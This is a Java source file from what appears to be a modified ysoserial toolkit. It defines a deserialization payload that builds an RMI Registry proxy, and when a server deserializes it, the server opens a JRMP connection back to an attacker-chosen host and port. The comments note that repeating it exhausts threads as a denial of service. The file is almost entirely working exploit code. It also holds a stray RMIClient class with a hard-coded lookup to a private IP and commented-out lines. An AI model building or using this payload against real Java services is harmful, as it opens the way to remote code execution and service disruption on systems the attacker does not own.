package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.exploit.service.ICombine;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.io.Serializable;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;


/**
 *
 *
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 *
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */
@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER })
public class JRMPClientWithCodebase extends PayloadRunner implements ObjectPayload<Registry> {

    public Registry getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClientWithCodebase.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return proxy;
    }

    public class RMIClient implements Serializable {
        public class Payload extends ArrayList<String> {}
        public void lookup() throws Exception {
            ICombine r = (ICombine)
                Naming.lookup("rmi://192.168.135.142:1099/refObj");
            List<String> li = new Payload();
//            li.get(0);
//            li.get(1);
//            System.out.println(r.combine(li,li));
        }
//        public static void main(String[] args) throws Exception {
//            new RMIClient().lookup();
//        }
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClientWithCodebase.class.getClassLoader());
        PayloadRunner.run(JRMPClientWithCodebase.class, args);
    }
}
